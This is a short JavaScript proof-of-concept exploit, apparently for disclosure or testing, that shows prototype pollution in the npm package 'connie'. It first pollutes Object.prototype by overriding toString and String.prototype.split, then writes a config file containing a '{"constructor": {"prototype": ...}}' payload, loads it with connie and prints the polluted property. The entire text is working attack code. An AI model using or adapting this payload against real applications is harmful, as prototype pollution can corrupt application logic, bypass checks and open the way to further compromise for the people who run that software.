var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
console.log({}.polluted);
const connie = require('connie');
const fs = require('fs');
const path = require('path');
const pathToConfig = path.resolve(__dirname, './config.json');
fs.writeFileSync(pathToConfig, `{"constructor": {"prototype": {"polluted":"yes"}}}`);
connie('file', pathToConfig).read().then(() => {
    console.log({}.polluted);
    fs.unlinkSync(pathToConfig);
});